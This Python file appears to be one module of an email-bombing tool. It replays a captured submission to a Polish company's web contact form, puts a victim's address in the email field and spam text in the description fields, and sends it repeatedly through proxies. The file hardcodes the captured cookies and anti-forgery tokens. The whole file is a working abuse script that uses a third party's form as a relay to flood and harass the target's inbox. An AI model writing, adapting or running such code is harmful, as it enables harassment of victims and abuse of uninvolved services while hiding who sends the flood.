from os.path import basename

import requests

from module import Spam

cookies = {
    'attrSaverSavedAttributes': '%7B%7D',
    '__RequestVerificationToken': 'ttsfTPm01teyfMVNIievjtKoFhlpZMlRiNF2SpAuuc_qCcCdAV1iOTY74Thuyr0ocoy11uVYdNmJ_XrfEp_LZKTmInUJU_Lg3UASJq1lifM1',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary6tKhrg4RiT2UdpJH',
    # 'Cookie': 'attrSaverSavedAttributes=%7B%7D; __RequestVerificationToken=ttsfTPm01teyfMVNIievjtKoFhlpZMlRiNF2SpAuuc_qCcCdAV1iOTY74Thuyr0ocoy11uVYdNmJ_XrfEp_LZKTmInUJU_Lg3UASJq1lifM1',
    'Origin': 'https://www.cloudflex.dtm.pl',
    'Referer': 'https://www.cloudflex.dtm.pl/Contact/ContactForm',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        return response.status_code < 400

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nAkNv27Ma1scIAHIQVI_bKnND-z6l-4-2djsQ8Sbwpm9MZ_drzgMYD9fLx8P0HXZbO2F_ftJmx2YllwdR6YtM1cMgE6xXAN4sEGzZZQMrikA1\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="Address"\r\n\r\n\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="Date"\r\n\r\n22-02-2023 09:47\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="Email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="ProblemDescription"\r\n\r\ntest\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="StepsToRestore"\r\n\r\ntest\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="SendCopyToMe"\r\n\r\ntrue\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="SendCopyToMe"\r\n\r\nfalse\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH\r\nContent-Disposition: form-data; name="attachments"; filename=""\r\nContent-Type: application/octet-stream\r\n\r\n\r\n------WebKitFormBoundary6tKhrg4RiT2UdpJH--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post('https://www.cloudflex.dtm.pl/Contact/ContactForm', cookies=cookies, headers=headers,
                                 data=data, proxies=self.get_proxies())

        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'))
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
